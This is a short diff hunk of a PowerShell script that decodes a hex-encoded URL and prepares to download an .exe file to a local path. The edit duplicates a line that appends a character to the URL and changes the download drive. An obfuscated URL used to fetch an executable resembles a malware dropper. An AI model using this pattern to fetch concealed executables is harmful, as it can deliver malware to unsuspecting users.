@@ -72,13 +72,13 @@ Write-Host $hexText
 # Convert the hex string to ASCII text (URL)
 $finalUrl = Convert-HexToText -hexInput $hexText
 $finalUrl = $finalUrl + 'e'
-
+$finalUrl = $finalUrl + 'e'
 # Display the final URL for troubleshooting
 Write-Host "Final URL from hex:"
 Write-Host $finalUrl
 
 # Specify the location where the file will be downloaded
-$downloadPath = "C:\DownloadedFile.exe" # Change to your desired path and filename
+$downloadPath = "S:\DownloadedFile.exe" # Change to your desired path and filename
 
 # Function to download the file from the URL
 Function Download-File {
